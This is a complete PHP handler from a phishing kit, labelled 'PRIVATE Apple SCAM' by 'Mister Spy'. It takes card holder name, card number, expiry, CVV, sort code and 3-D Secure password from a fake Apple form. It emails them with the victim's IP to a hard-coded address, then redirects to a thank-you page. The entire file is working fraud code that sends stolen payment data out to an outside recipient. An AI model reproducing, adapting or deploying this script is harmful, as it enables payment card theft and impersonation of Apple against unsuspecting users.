<?php

/*
╔═══════════════════════════════════╗
╠═════ PRIVATE Apple SCAM ══════════╣
╠══════ BY Mister Spy  Tn       ════╣
╚═══════════════════════════════════╝
http://www.facebook.com/tazspy
*/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "################[Priv8 Apple Scama By Mister Spy]################################==\n";
$message .= "Card Holder  : ".$_POST['spy-holder']."\n";
$message .= "Card Number  : ".$_POST['spy-card']."\n";
$message .= "Expires Month/Year: ".$_POST['spy-month']."/".$_POST['spy-year']."\n";
$message .= "Cvv  : ".$_POST['spy-cvv']."\n";
$message .= "Sort Code : ".$_POST['spy-sort']."\n";
$message .= "VBV Password  : ".$_POST['spy-vbv']."\n";
$message .= "################======[IP]################=====\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "################=[Priv8 Apple Scama By Mister Spy]################\n";


$to = "mo3tazcoder@gmail.com";
$subject = "By 2015 {Spy}  ♥VBV♥ [$ip]";
$headers = "From:Apple ♥vbv♥<mrspy@codex.com>";
mail($to, $subject, $message,$headers);


header("Location:ThankYou.html");


?>